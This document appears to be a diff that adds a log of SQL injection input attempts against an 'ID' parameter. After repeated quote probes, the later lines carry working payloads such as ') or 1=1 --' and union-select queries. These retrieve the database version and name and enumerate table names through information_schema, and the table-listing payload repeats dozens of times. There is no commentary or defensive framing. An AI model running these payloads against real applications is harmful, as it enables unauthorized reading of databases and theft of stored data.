@@ -1,0 +1,212 @@
+ID:1
+ID:1'
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1
+ID:1'
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1'
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1
+ID:1
+ID:1
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1
+ID:1
+ID:1'
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1
+ID:1
+ID:1'
+ID:1"
+ID:1"
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1"union
+ID:1'
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1"
+ID:1) or 1=1 --
+ID:1
+ID:1
+ID:1
+ID:1"
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1
+ID:1") or ("1")=("1
+ID:1") or ("1")=("1 union
+ID:1") or ("1")=("1 union select 1,2,3
+ID:1
+ID:-1") union select 1,2,3 -- 
+ID:-1") union select 1,2,version() -- 
+ID:-1") union select 1,database(),version() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
+ID:-1") union select 1,table_name,3 from information_schema.tables where table_schema=database() -- 
